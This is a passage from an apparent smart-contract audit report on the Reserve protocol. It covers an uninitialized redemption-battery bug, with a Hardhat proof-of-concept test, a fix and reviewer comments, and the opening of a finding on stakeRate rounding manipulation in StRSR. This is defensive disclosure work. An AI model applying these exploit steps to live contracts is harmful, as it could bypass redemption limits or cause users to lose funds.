class=\"mtk12\">charge</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">battery</span><span class=\"mtk1\">.</span><span class=\"mtk12\">lastCharge</span><span class=\"mtk1\"> + (</span><span class=\"mtk12\">amtPerHour</span><span class=\"mtk1\"> * </span><span class=\"mtk12\">blocks</span><span class=\"mtk1\">) / </span><span class=\"mtk12\">BLOCKS_PER_HOUR</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">maxCharge</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">amtPerHour</span><span class=\"mtk1\"> &gt; </span><span class=\"mtk12\">supply</span><span class=\"mtk1\"> ? </span><span class=\"mtk12\">supply</span><span class=\"mtk1\"> : </span><span class=\"mtk12\">amtPerHour</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">charge</span><span class=\"mtk1\"> &gt; </span><span class=\"mtk12\">maxCharge</span><span class=\"mtk1\">) </span><span class=\"mtk12\">charge</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">maxCharge</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span></code></pre>\n<p>The linear redemption limit is calculated in the <code>currentCharge</code> function. This function calculates the delta blocks by <code>uint48 blocks = uint48(block.number) - battery.lastBlock;</code>.</p>\n<p>The bug here is that the <code>lastBlock</code> value is never initialized by the <code>RTokenP1</code> contract so its value defaults to <code>0</code>. This results in incorrect delta blocks value as the delta blocks comes out to be an incorrectly large value</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"14\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">        blocks = current block number - 0 = current block number</span></span></code></pre>\n<p>Due do this issue, the <code>currentCharge</code> value comes out to be way larger than the actual intended value for the first RToken redemption. The <code>maxCharge</code> cap at the end of <code>currentCharge</code> function caps the result to the current total supply of RToken.</p>\n<p>The issue results in an instant first RToken redemption for the full <code>totalSupply</code> of the RToken. The battery discharging mechanism is completely neglected.</p>\n<p>It should be noted that the issue only exists for the first ever redemption as during the first redemption the <code>lastBlock</code> value gets updated with current block number.</p>\n<h3 id=\"proof-of-concept-2\" style=\"position:relative;\"><a href=\"#proof-of-concept-2\" aria-label=\"proof of concept 2 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>The following test case was added to <code>test/RToken.test.ts</code> file and was ran using command <code>PROTO_IMPL=1 npx hardhat test ./test/RToken.test.ts</code>.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"typescript\" data-index=\"15\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk12\">describe</span><span class=\"mtk1\">.</span><span class=\"mtk11\">only</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&#39;Battery lastBlock bug&#39;</span><span class=\"mtk1\">, () </span><span class=\"mtk4\">=&gt;</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">it</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&#39;redemption battery does not work on first redemption&#39;</span><span class=\"mtk1\">, </span><span class=\"mtk4\">async</span><span class=\"mtk1\"> () </span><span class=\"mtk4\">=&gt;</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk3\">// real chain scenario</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk11\">advanceBlocks</span><span class=\"mtk1\">(</span><span class=\"mtk7\">1_000_000</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk10\">Promise</span><span class=\"mtk1\">.</span><span class=\"mtk11\">all</span><span class=\"mtk1\">(</span><span class=\"mtk12\">tokens</span><span class=\"mtk1\">.</span><span class=\"mtk11\">map</span><span class=\"mtk1\">((</span><span class=\"mtk12\">t</span><span class=\"mtk1\">) </span><span class=\"mtk4\">=&gt;</span><span class=\"mtk1\"> </span><span class=\"mtk12\">t</span><span class=\"mtk1\">.</span><span class=\"mtk11\">connect</span><span class=\"mtk1\">(</span><span class=\"mtk12\">addr1</span><span class=\"mtk1\">).</span><span class=\"mtk11\">approve</span><span class=\"mtk1\">(</span><span class=\"mtk12\">rToken</span><span class=\"mtk1\">.</span><span class=\"mtk12\">address</span><span class=\"mtk1\">, </span><span class=\"mtk12\">ethers</span><span class=\"mtk1\">.</span><span class=\"mtk12\">constants</span><span class=\"mtk1\">.</span><span class=\"mtk12\">MaxUint256</span><span class=\"mtk1\">)))</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk11\">expect</span><span class=\"mtk1\">(</span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">rToken</span><span class=\"mtk1\">.</span><span class=\"mtk11\">totalSupply</span><span class=\"mtk1\">()).</span><span class=\"mtk12\">to</span><span class=\"mtk1\">.</span><span class=\"mtk11\">eq</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">rToken</span><span class=\"mtk1\">.</span><span class=\"mtk11\">connect</span><span class=\"mtk1\">(</span><span class=\"mtk12\">owner</span><span class=\"mtk1\">).</span><span class=\"mtk11\">setRedemptionRateFloor</span><span class=\"mtk1\">(</span><span class=\"mtk11\">fp</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&#39;1e4&#39;</span><span class=\"mtk1\">))</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">rToken</span><span class=\"mtk1\">.</span><span class=\"mtk11\">connect</span><span class=\"mtk1\">(</span><span class=\"mtk12\">owner</span><span class=\"mtk1\">).</span><span class=\"mtk11\">setScalingRedemptionRate</span><span class=\"mtk1\">(</span><span class=\"mtk11\">fp</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&#39;0&#39;</span><span class=\"mtk1\">))</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk3\">// first issue</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk4\">const</span><span class=\"mtk1\"> </span><span class=\"mtk12\">issueAmount</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">fp</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&#39;10000&#39;</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">rToken</span><span class=\"mtk1\">.</span><span class=\"mtk11\">connect</span><span class=\"mtk1\">(</span><span class=\"mtk12\">addr1</span><span class=\"mtk1\">)[</span><span class=\"mtk8\">&#39;issue(uint256)&#39;</span><span class=\"mtk1\">](</span><span class=\"mtk12\">issueAmount</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk11\">expect</span><span class=\"mtk1\">(</span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">rToken</span><span class=\"mtk1\">.</span><span class=\"mtk11\">balanceOf</span><span class=\"mtk1\">(</span><span class=\"mtk12\">addr1</span><span class=\"mtk1\">.</span><span class=\"mtk12\">address</span><span class=\"mtk1\">)).</span><span class=\"mtk12\">to</span><span class=\"mtk1\">.</span><span class=\"mtk11\">eq</span><span class=\"mtk1\">(</span><span class=\"mtk12\">issueAmount</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk11\">expect</span><span class=\"mtk1\">(</span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">rToken</span><span class=\"mtk1\">.</span><span class=\"mtk11\">totalSupply</span><span class=\"mtk1\">()).</span><span class=\"mtk12\">to</span><span class=\"mtk1\">.</span><span class=\"mtk11\">eq</span><span class=\"mtk1\">(</span><span class=\"mtk12\">issueAmount</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk3\">// first redemption</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk11\">expect</span><span class=\"mtk1\">(</span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">rToken</span><span class=\"mtk1\">.</span><span class=\"mtk11\">redemptionLimit</span><span class=\"mtk1\">()).</span><span class=\"mtk12\">to</span><span class=\"mtk1\">.</span><span class=\"mtk11\">eq</span><span class=\"mtk1\">(</span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">rToken</span><span class=\"mtk1\">.</span><span class=\"mtk11\">totalSupply</span><span class=\"mtk1\">())    </span><span class=\"mtk3\">// for first redemption the currentCharge value is capped by rToken.totalSupply() </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">rToken</span><span class=\"mtk1\">.</span><span class=\"mtk11\">connect</span><span class=\"mtk1\">(</span><span class=\"mtk12\">addr1</span><span class=\"mtk1\">).</span><span class=\"mtk11\">redeem</span><span class=\"mtk1\">(</span><span class=\"mtk12\">issueAmount</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk11\">expect</span><span class=\"mtk1\">(</span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">rToken</span><span class=\"mtk1\">.</span><span class=\"mtk11\">totalSupply</span><span class=\"mtk1\">()).</span><span class=\"mtk12\">to</span><span class=\"mtk1\">.</span><span class=\"mtk11\">eq</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk3\">// second redemption</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">rToken</span><span class=\"mtk1\">.</span><span class=\"mtk11\">connect</span><span class=\"mtk1\">(</span><span class=\"mtk12\">addr1</span><span class=\"mtk1\">)[</span><span class=\"mtk8\">&#39;issue(uint256)&#39;</span><span class=\"mtk1\">](</span><span class=\"mtk12\">issueAmount</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk11\">expect</span><span class=\"mtk1\">(</span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">rToken</span><span class=\"mtk1\">.</span><span class=\"mtk11\">balanceOf</span><span class=\"mtk1\">(</span><span class=\"mtk12\">addr1</span><span class=\"mtk1\">.</span><span class=\"mtk12\">address</span><span class=\"mtk1\">)).</span><span class=\"mtk12\">to</span><span class=\"mtk1\">.</span><span class=\"mtk11\">eq</span><span class=\"mtk1\">(</span><span class=\"mtk12\">issueAmount</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk3\">// from second redemtion onwards the battery discharge mechanism takes place correctly</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk11\">expect</span><span class=\"mtk1\">(</span><span class=\"mtk12\">rToken</span><span class=\"mtk1\">.</span><span class=\"mtk11\">connect</span><span class=\"mtk1\">(</span><span class=\"mtk12\">addr1</span><span class=\"mtk1\">).</span><span class=\"mtk11\">redeem</span><span class=\"mtk1\">(</span><span class=\"mtk12\">issueAmount</span><span class=\"mtk1\">)).</span><span class=\"mtk12\">to</span><span class=\"mtk1\">.</span><span class=\"mtk12\">be</span><span class=\"mtk1\">.</span><span class=\"mtk11\">revertedWith</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&#39;redemption battery insufficient&#39;</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    })</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  })</span></span></span></code></pre>\n<h3 id=\"tools-used\" style=\"position:relative;\"><a href=\"#tools-used\" aria-label=\"tools used permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Tools Used</h3>\n<p>Hardhat</p>\n<h3 id=\"recommended-mitigation-steps-2\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-2\" aria-label=\"recommended mitigation steps 2 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>The <code>battery.lastBlock</code> value must be initialized in the <code>init</code> function of <code>RTokenP1</code></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"16\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">init</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// ...</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    ) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">initializer</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// ...</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">battery</span><span class=\"mtk1\">.</span><span class=\"mtk12\">lastBlock</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">uint48</span><span class=\"mtk1\">(</span><span class=\"mtk12\">block</span><span class=\"mtk1\">.</span><span class=\"mtk12\">number</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span></code></pre>\n<p><strong><a href=\"https://github.com/code-423n4/2023-01-reserve-findings/issues/452#issuecomment-1399277278\">0xean (judge) decreased severity to Medium and commented</a>:</strong></p>\n<blockquote>\n<p>The first redemption is not constrained by the battery properly from what I can tell in the code base.  I don’t see sufficient evidence that this would lead to a direct loss of user funds however.  I will leave open for sponsor review, but think either Medium severity or below is appropriate without a better statement of impact from the warden.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2023-01-reserve-findings/issues/452#issuecomment-1405393242\">tbrent (Reserve) confirmed and commented</a>:</strong></p>\n<blockquote>\n<p>This can’t lead to loss of user funds, but I think it is indeed Medium severity</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2023-01-reserve-findings/issues/452#issuecomment-1421598482\">tbrent (Reserve) commented</a>:</strong></p>\n<blockquote>\n<p>Fixed here: <a href=\"https://github.com/reserve-protocol/protocol/pull/584\">https://github.com/reserve-protocol/protocol/pull/584</a></p>\n</blockquote>\n<p><strong>Status:</strong> Mitigation confirmed. Full details in reports from <a href=\"https://github.com/code-423n4/2023-02-reserve-mitigation-contest-findings/issues/50\">0xA5DF</a>, <a href=\"https://github.com/code-423n4/2023-02-reserve-mitigation-contest-findings/issues/16\">HollaDieWaldfee</a>, and <a href=\"https://github.com/code-423n4/2023-02-reserve-mitigation-contest-findings/issues/26\">AkshaySrivastav</a>.</p>\n<hr>\n<h2 id=\"m-02-attacker-can-make-stakerate-to-be-1-in-the-strsr-contract-and-users-depositing-tokens-can-lose-funds-because-of-the-big-rounding-error\" style=\"position:relative;\"><a href=\"#m-02-attacker-can-make-stakerate-to-be-1-in-the-strsr-contract-and-users-depositing-tokens-can-lose-funds-because-of-the-big-rounding-error\" aria-label=\"m 02 attacker can make stakerate to be 1 in the strsr contract and users depositing tokens can lose funds because of the big rounding error permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2023-01-reserve-findings/issues/439\">[M-02] Attacker can make stakeRate to be 1 in the StRSR contract and users depositing tokens can lose funds because of the big rounding error</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2023-01-reserve-findings/issues/439\">unforgiven</a></em></p>\n<p><a href=\"https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/StRSR.sol#L160-L188\">https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/StRSR.sol#L160-L188</a><br>\n<a href=\"https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/StRSR.sol#L496-L530\">https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/StRSR.sol#L496-L530</a><br>\n<a href=\"https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/StRSR.sol#L212-L237\">https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/StRSR.sol#L212-L237</a></p>\n<p>Code calculates amount of stake token and rsr token based on <code>stakeRate</code> and if <code>stakeRate</code> was near <code>1e18</code> then division error is small but attacker can cause <code>stakeRate</code> to be 1 and that can cause users to loss up to <code>1e18</code> token during stake and unstake.</p>\n<h3 id=\"proof-of-concept-3\" style=\"position:relative;\"><a href=\"#proof-of-concept-3\" aria-label=\"proof of concept 3 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>This is <code>init()</code> code:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"17\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">    function init(</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        IMain main_,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        string calldata name_,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        string calldata symbol_,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        uint48 unstakingDelay_,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        uint48 rewardPeriod_,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        uint192 rewardRatio_</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    ) external initializer {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        require(bytes(name_).length &gt; 0, &quot;name empty&quot;);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        require(bytes(symbol_).length &gt; 0, &quot;symbol empty&quot;);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        __Component_init(main_);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        __EIP712_init(name_, &quot;1&quot;);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        name = name_;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        symbol = symbol_;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        assetRegistry = main_.assetRegistry();</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        backingManager = main_.backingManager();</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        basketHandler = main_.basketHandler();</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        rsr = IERC20(address(main_.rsr()));</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        payoutLastPaid = uint48(block.timestamp);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        rsrRewardsAtLastPayout = main_.rsr().balanceOf(address(this));</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        setUnstakingDelay(unstakingDelay_);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        setRewardPeriod(rewardPeriod_);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        setRewardRatio(rewardRatio_);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        beginEra();</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        beginDraftEra();</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    }</span></span></code></pre>\n<p>As you can see it sets the value of the <code>rsrRewardsAtLastPayout</code> as contract balance when contract is deployed.\nThis is <code>_payoutReward()</code> code:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"18\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">    function _payoutRewards() internal {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        if (block.timestamp &lt; payoutLastPaid + rewardPeriod) return;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        uint48 numPeriods = (uint48(block.timestamp) - payoutLastPaid) / rewardPeriod;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        uint192 initRate = exchangeRate();</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        uint256 payout;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        // Do an actual payout if and only if stakers exist!</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        if (totalStakes &gt; 0) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            // Paying out the ratio r, N times, equals paying out the ratio (1 - (1-r)^N) 1 time.</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            // Apply payout to RSR backing</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            // payoutRatio: D18 = FIX_ONE: D18 - FixLib.powu(): D18</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            // Both uses of uint192(-) are fine, as it&#39;s equivalent to FixLib.sub().</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            uint192 payoutRatio = FIX_ONE - FixLib.powu(FIX_ONE - rewardRatio, numPeriods);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            // payout: {qRSR} = D18{1} * {qRSR} / D18</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            payout = (payoutRatio * rsrRewardsAtLastPayout) / FIX_ONE;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            stakeRSR += payout;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        }</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        payoutLastPaid += numPeriods * rewardPeriod;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        rsrRewardsAtLastPayout = rsrRewards();</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        // stakeRate else case: D18{qStRSR/qRSR} = {qStRSR} * D18 / {qRSR}</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        // downcast is safe: it&#39;s at most 1e38 * 1e18 = 1e56</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        // untestable:</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        //      the second half of the OR comparison is untestable because of the invariant:</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        //      if totalStakes == 0, then stakeRSR == 0</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        stakeRate = (stakeRSR == 0 || totalStakes == 0)</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            ? FIX_ONE</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            : uint192((totalStakes * FIX_ONE_256 + (stakeRSR - 1)) / stakeRSR);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        emit RewardsPaid(payout);</span></span>\n<span 